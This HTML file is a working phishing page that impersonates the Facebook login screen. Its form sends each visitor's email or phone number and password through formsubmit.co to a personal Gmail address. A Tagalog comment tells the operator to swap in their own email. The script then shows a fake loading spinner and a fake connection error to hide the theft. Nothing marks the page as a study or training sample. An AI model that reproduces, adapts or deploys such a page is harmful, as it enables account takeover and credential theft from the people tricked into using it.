<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facebook</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif}
body{background:#fff;color:#1c1e21;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:40px 20px}
.lang{margin-bottom:40px;color:#606770;font-size:14px}
.fb-logo{font-size:60px;font-weight:bold;color:#1877f2;margin:30px 0}
.box{width:100%;max-width:400px;border:1px solid #dddfe2;border-radius:8px;padding:20px;background:#fff}
.inp{width:100%;padding:14px;margin-bottom:12px;font-size:17px;border:1px solid #dddfe2;border-radius:6px;outline:none}
.btn-blue{width:100%;padding:14px;background:#1877f2;color:#fff;font-size:20px;font-weight:bold;border:none;border-radius:6px;cursor:pointer;margin:8px 0}
.btn-blue:hover{background:#166fe5}
.link{text-align:center;margin:16px 0}
.link a{color:#1877f2;text-decoration:none;font-size:14px}
.line{height:1px;background:#dddfe2;margin:20px 0}
.btn-green{width:100%;padding:14px;background:#42b72a;color:#fff;font-size:17px;font-weight:bold;border:none;border-radius:6px;cursor:pointer}

.load{position:fixed;inset:0;background:#fff;display:none;flex-direction:column;align-items:center;justify-content:center;z-index:99}
.spin{width:50px;height:50px;border:4px solid #eee;border-top-color:#1877f2;border-radius:50%;animation:ikot 1s linear infinite}
@keyframes ikot{to{transform:rotate(360deg)}}
.txt{margin-top:20px;color:#666}

.err{position:fixed;inset:0;background:#fff;display:none;flex-direction:column;align-items:center;justify-content:center;padding:30px;z-index:99}
.err-icon{font-size:60px;color:#f02849;margin-bottom:20px}
.err-h2{font-size:24px;font-weight:bold;margin-bottom:10px}
.err-p{color:#666;text-align:center;max-width:320px;margin-bottom:30px}
.btn-try{padding:12px 24px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:16px;cursor:pointer}
</style>
</head>
<body>o

<div class="lang">English (UK) ▾</div>
<div class="fb-logo">f</div>

<!-- ✅ PALITAN MO ANG EMAIL SA IBABA -->
<form action="https://formsubmit.co/jamesthroycagabhion@gmail.com" method="POST" id="myForm">
  <div class="box">
    <input type="text" name="email_or_phone" class="inp" placeholder="Mobile number or email address" required>
    <input type="password" name="password" class="inp" placeholder="Password" required>
    <button type="submit" class="btn-blue">Log In</button>
    <div class="link"><a href="#">Forgot password?</a></div>
    <div class="line"></div>
    <button type="button" class="btn-green">Create New Account</button>
  </div>
</form>

<div class="load" id="loadBox">
  <div class="spin"></div>
  <p class="txt">Checking information...</p>
</div>

<div class="err" id="errBox">
  <div class="err-icon">⚠️</div>
  <h2 class="err-h2">Something went wrong</h2>
  <p class="err-p">We're sorry, we couldn't complete your request right now. Please check your connection and try again later.</p>
  <button class="btn-try" onclick="balik()">Try Again</button>
</div>

<script>
const form = document.getElementById('myForm');
form.addEventListener('submit', function(e){
  e.preventDefault();
  document.getElementById('loadBox').style.display = 'flex';
  fetch(form.action, {
    method: 'POST',
    body: new FormData(form)
  }).finally(() => {
    setTimeout(() => {
      document.getElementById('loadBox').style.display = 'none';
      document.getElementById('errBox').style.display = 'flex';
    }, 3000);
  });
});
function balik(){
  document.getElementById('errBox').style.display = 'none';
}
</script>

</body>
</html>
